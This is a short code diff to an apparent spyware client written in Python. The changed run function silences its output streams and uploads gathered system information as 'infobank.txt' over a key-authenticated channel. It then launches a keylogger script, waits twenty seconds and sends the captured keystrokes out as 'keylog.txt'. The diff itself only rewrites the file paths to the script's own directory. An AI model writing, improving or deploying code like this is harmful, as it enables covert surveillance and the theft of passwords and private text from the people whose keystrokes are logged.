@@ -209,8 +209,10 @@ def sendFile(dataFile,  keyLoc, filename):
     chan.close()
     return 0
 def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
-    keyLoc = os.getcwd() # the key must be next to the client
-    keyLoc += '/test_rsa.key'
+    cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
+    keyLoc = cwd
+    keyLoc +=  '/test_rsa.key'
+    
     
     infoBank = getInput()
     sendFile(infoBank,  keyLoc,  'infobank.txt')
@@ -243,11 +245,11 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     sys.stdout.flush() 
     sys.stderr.flush()
 
-    keylog("/home/michael/sandbox/project/mine/keylogger.py")
+    keylog(cwd+'/keylogger.py') # keylogger.py is located in the working directory of the client/daemon
 
     time.sleep(20)
 
-    sendFile("loggedKeys.log", keyLoc,  'keylog.txt')
+    sendFile(cwd+"/loggedKeys.log", keyLoc,  'keylog.txt')
     os._exit(0)
     
 # MAIN # 
